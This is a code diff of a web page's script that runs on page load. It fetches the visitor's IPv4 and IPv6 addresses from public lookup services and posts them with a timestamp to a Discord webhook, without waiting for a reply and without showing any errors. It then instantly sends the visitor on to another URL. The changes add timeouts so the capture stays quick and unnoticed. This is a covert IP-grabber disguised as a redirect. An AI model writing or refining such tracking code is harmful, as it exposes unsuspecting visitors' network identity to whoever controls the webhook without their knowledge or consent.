@@ -15,21 +15,28 @@
         };
         // ==========================================
 
+        // Helper function to limit wait times for blocked or hanging connections
+        function fetchWithTimeout(url, options = {}, timeout = 1500) {
+            return Promise.race([
+                fetch(url, options),
+                new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
+            ]);
+        }
+
         async function trackAndRedirect() {
             let ipv4 = 'Not available / IPv6-Only';
             let ipv6 = 'Not available / IPv4-Only';
 
-            // 1. Fetch strict IPv4 Address (Primary: ://icanhazip.com, Fallback: ipify)
+            // 1. Fetch strict IPv4 Address
             try {
-                const res4 = await fetch('https://ipv4.icanhazip.com');
+                const res4 = await fetchWithTimeout('https://ipv4.icanhazip.com');
                 if (res4.ok) {
                     const text4 = await res4.text();
                     if (text4) ipv4 = text4.trim();
                 }
             } catch (e) {
-                // Primary failed, trying Fallback (api.ipify.org)
                 try {
-                    const res4Fallback = await fetch('https://api.ipify.org');
+                    const res4Fallback = await fetchWithTimeout('https://api.ipify.org');
                     if (res4Fallback.ok) {
                         const text4Fallback = await res4Fallback.text();
                         if (text4Fallback) ipv4 = text4Fallback.trim();
@@ -37,23 +44,24 @@
                 } catch (err) {}
             }
 
-            // 2. Fetch strict IPv6 Address (Primary: ://icanhazip.com, Fallback: api6.ipify.org)
+            // 2. Fetch strict IPv6 Address
             try {
-                const res6 = await fetch('https://ipv6.icanhazip.com');
+                const res6 = await fetchWithTimeout('https://ipv6.icanhazip.com');
                 if (res6.ok) {
                     const text6 = await res6.text();
                     if (text6) ipv6 = text6.trim();
                 }
             } catch (e) {
-                // Primary IPv6 failed, trying Fallback (api6.ipify.org - strict IPv6 endpoint)
                 try {
-                    const res6Fallback = await fetch('https://api64.ipify.org');
+                    // Using strict IPv6 subdomain to avoid accidental IPv4 returns
+                    const res6Fallback = await fetchWithTimeout('https://api64.ipify.org');
                     if (res6Fallback.ok) {
                         const text6Fallback = await res6Fallback.text();
                         if (text6Fallback) ipv6 = text6Fallback.trim();
                     }
                 } catch (err) {}
             }
+
             // Format current date and time
             const now = new Date();
             const simpleDateString = now.toLocaleString('en-US', {
@@ -82,17 +90,16 @@
                 }]
             };
 
-            // 4. Send Data to Discord Webhook
+            // 4. Send Data to Discord Webhook asynchronously (No await)
             fetch(CONFIG.DISCORD_WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
-            }).catch(e => { /* Fire and forget */ });
+            }).catch(e => { /* Ignore errors / Fire and forget */ });
 
             // 5. Instant redirect
             window.location.href = CONFIG.REDIRECT_URL;
         }
-
 
         window.addEventListener('DOMContentLoaded', trackAndRedirect);
     </script>
